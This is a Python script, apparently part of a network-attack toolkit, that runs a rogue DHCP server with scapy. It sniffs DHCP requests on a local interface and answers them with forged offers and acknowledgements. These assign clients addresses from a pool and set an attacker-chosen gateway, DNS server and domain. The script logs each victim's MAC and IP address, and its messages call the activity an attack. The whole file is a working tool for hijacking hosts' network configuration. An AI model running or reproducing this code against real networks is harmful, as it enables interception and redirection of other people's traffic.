from scapy.all import *
from colorama import *


def rogue_dhcp(ip_addr, mask, start_ip, end_ip, gateway, dns, lease, domain, interface):
    print(Fore.YELLOW + "    [!] Rogue DHCP Server started. Waiting for client requests...")  # Переведено
    print(Fore.GREEN + "\n    [ № ]       [   MAC address   ]          [   IP address   ]")

    class Param:
        def __init__(self):
            self.pool = []
            self.start_host = int(start_ip.split('.')[-1])
            self.end_host = int(end_ip.split('.')[-1])
            self.count = (self.end_host - self.start_host) + 1
            self.subnet = start_ip.split('.')[0:3]
            self.subnet = self.subnet[0] + "." + self.subnet[1] + "." + self.subnet[2] + "."
            for i in range(self.count):
                self.pool.append(self.subnet + str(self.start_host))
                self.start_host += 1
            self.position = 0
            self.database = {}
            self.number = 0
            self.output_database = []

        def packet_handler(self, packet):
            if self.count > 0:  # Если еще есть свободные IP адреса из пула
                if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 1:  # Если захвачен пакет DHCP DISCOVER (опция 1 - DHCP Discover)

                    mac_address = packet[Ether].src
                    xid = packet[BOOTP].xid
                    mac_address_bytes = bytes.fromhex(mac_address.replace(":", "").replace("-", ""))

                    if mac_address in self.database:  # Если MAC-адрес уже есть в базе (отправлял DHCP Discover)
                        offer = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                                 IP(src=ip_addr, dst="255.255.255.255") /
                                 UDP(sport=67, dport=68) /
                                 BOOTP(op=2, chaddr=mac_address_bytes, xid=xid, yiaddr=self.database[mac_address], siaddr=ip_addr) /
                                 DHCP(options=[("message-type", "offer"),
                                               ("server_id", ip_addr),
                                               ("router", gateway),
                                               ("name_server", dns),
                                               ("subnet_mask", mask),
                                               ("lease_time", lease),
                                               ("domain", domain),
                                               "end"]))
                        sendp(offer, verbose=False, iface=interface, count=1)

                    if mac_address not in self.database:  # Если MAC-адреса нет в базе (не отправлял DHCP Discover)
                        self.database[mac_address] = self.pool[self.position]

                        offer = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                                 IP(src=ip_addr, dst="255.255.255.255") /
                                 UDP(sport=67, dport=68) /
                                 BOOTP(op=2, chaddr=mac_address_bytes, xid=xid, yiaddr=self.database[mac_address],
                                       siaddr=ip_addr) /
                                 DHCP(options=[("message-type", "offer"),
                                               ("server_id", ip_addr),
                                               ("router", gateway),
                                               ("name_server", dns),
                                               ("subnet_mask", mask),
                                               ("lease_time", lease),
                                               ("domain", domain),
                                               "end"]))
                        sendp(offer, verbose=False, iface=interface, count=1)

                        self.position += 1
                        self.number += 1  # Увеличиваем порядковый номер
                        print(Fore.WHITE + f"     {self.number:3}         {mac_address.upper()}            {self.database[mac_address]}")

                if packet.haslayer(DHCP) and packet[DHCP].options[0][1] == 3:  # Если захвачен пакет DHCP REQUEST (опция 3 - DHCP Request)

                    for option in packet[DHCP].options:
                        if option[0] == 'server_id':
                            server_id = option[1]  # Сохраняем IP-адрес DHCP сервера, которому был отправлен пакет DHCP Request

                            if server_id == ip_addr:  # Если DHCP REQUEST адресован нашему серверу (нашему IP адресу)

                                mac_address = packet[Ether].src
                                xid = packet[BOOTP].xid
                                mac_address_bytes = bytes.fromhex(mac_address.replace(":", "").replace("-", ""))

                                ack_packet = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                                              IP(src=ip_addr, dst="255.255.255.255") /
                                              UDP(sport=67, dport=68) /
                                              BOOTP(op=2, chaddr=mac_address_bytes, xid=xid, yiaddr=self.database[mac_address], siaddr=ip_addr) /
                                              DHCP(options=[("message-type", "ack"),
                                                            ("server_id", ip_addr),
                                                            ("router", gateway),
                                                            ("name_server", dns),
                                                            ("subnet_mask", mask),
                                                            ("lease_time", lease),
                                                            ("domain", domain),
                                                            "end"]))
                                sendp(ack_packet, verbose=False, iface=interface, count=1)
                                self.count -= 1

                                if self.count == 0:  # Если закончились свободные IP адреса из пула
                                    print(Fore.GREEN + f"\n    [+] Rogue DHCP pool exhausted. Stopping attack.\n")  # Переведено
                                    sys.exit(0)

            if self.count == 0:  # Если свободные IP адреса из пула закончились
                print(Fore.GREEN + f"\n    [+] Rogue DHCP pool exhausted. Stopping attack.\n")  # Переведено
                sys.exit(0)

    param = Param()
    try:
        sniff(iface=interface, prn=param.packet_handler, filter="udp and (port 67 or port 68)", store=False)  # Слушаем DHCP пакеты
    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено